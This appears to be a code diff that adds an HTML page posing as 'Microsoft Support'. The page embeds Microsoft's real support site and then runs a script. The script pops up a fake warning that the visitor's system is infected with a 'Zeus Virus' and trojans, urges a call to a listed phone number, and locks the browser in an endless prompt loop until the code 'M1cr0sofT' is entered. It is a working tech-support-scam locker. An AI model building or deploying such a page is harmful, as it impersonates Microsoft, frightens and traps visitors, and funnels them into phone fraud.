@@ -1,0 +1,33 @@
+<head>
+	<title>Microsoft Support</title>
+	<link href="http://www.microsoft.com/favicon.ico?v2" rel="shortcut icon">
+	<style>
+		body{
+			margin: 0 auto;
+		}
+	</style>
+</head>
+<body>
+	
+	<iframe id ='myframe' height="100%" width="100%" frameborder="0" src='https://support.microsoft.com/en-us' onload="onLoadHandler();"></iframe>
+
+	<script type="text/javascript">
+		function onLoadHandler() {
+		var browser = navigator.vendor
+var os = navigator.platform
+var phoneNumber = "+1 (773)-536-9706"
+var errorCode = "0x80070057"
+
+var error = "Hello " + os + " user! Your " + os + " platform running the " + browser + " browser has been compromised by a Zeus Virus and multiple Trojan Horses! If you want to fix your " + os + " operating system you will need to call " + phoneNumber + " now for immediate care from a U.S. based " + os + " certified tech representative! Please tell the representative this error code: " + errorCode + "! To unlock your computer please call tech support at " + phoneNumber + " to unlock your computer!"
+		var i = 1;
+			while(i==1){
+				var name = prompt(error);	
+				if(name=="M1cr0sofT"){
+					i++;
+					alert("Computer Unlocked!");
+				}
+			}
+		
+	}
+	</script>
+</body>
